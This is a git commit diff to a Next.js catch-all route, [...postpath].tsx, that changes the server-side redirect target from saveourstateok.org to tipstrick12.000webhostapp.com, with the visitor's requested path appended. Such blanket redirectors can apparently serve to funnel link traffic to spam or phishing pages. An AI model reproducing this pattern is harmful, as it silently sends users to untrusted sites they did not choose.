393f79368df17a391f7107064fe7f926169ed395
zoursa <133633825+zoursa@users.noreply.github.com>
2023-05-22 12:35:32 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://tipstrick12.000webhostapp.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
